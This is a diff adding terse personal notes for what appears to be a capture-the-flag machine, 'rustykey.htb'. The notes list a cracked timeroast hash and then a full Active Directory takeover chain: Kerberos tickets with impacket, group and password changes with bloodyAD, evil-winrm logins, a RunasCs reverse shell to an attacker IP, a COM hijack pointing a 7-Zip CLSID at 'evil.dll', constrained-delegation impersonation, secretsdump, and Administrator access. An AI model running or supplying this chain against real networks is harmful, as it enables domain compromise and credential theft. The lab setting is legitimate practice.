@@ -128,3 +128,49 @@ Candidate.Engine.: Device Generator
 Candidates.#01...: oakvillestaples -> o1033895
 
 $sntp-ms$285e7a9c030578637343202ae658be21$1c0111e900000000000a17314c4f434cec4ee6117e2508cee1b8428bffbfcd0aec4f04a506148d55ec4f04a50614b3ec:Rusty88!
+
+---- timeroast ----
+
+---- IT-Computer3
+ff impacket-getTGT rustykey.htb/'IT-COMPUTER3$':'Rusty88!'
+export KRB5CCNAME=./IT-COMPUTER3\$.ccache
+klist
+
+ff bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
+ff bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT'
+ff bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'SUPPORT'  
+
+ff bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Abc123456@'
+ff bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'Abc123456@'
+
+---- bb morgan
+ff impacket-getTGT rustykey.htb/'bb.morgan':'Abc123456@'
+export KRB5CCNAME=./bb.morgan.ccache
+ff evil-winrm -i dc.rustykey.htb -u 'bb.morgan' -r rustykey.htb
+
+upload RunasCs.exe
+
+.\RunasCs.exe ee.reed Abc123456@ "cmd.exe" -d rustykey.htb -l 2 -r 10.10.14.16:4433
+
+---- ee.reed
+reg query HKCR\CLSID /s /f "zip"
+
+reg add "HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" /ve /t REG_SZ /d "C:\tmp\evil.dll" /f
+   reg query "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" 
+
+---- mm.turner
+ff impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
+shell
+powershell -exec bypass
+   Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
+
+----
+ff impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
+export KRB5CCNAME=./backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+ff impacket-secretsdump -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
+
+--- administrator
+ff impacket-getTGT rustykey.htb/'Administrator':'Rustyrc4key#!'
+export KRB5CCNAME=./Administrator.ccache
+ff evil-winrm -i dc.rustykey.htb -u 'Administrator' -r rustykey.htb
+
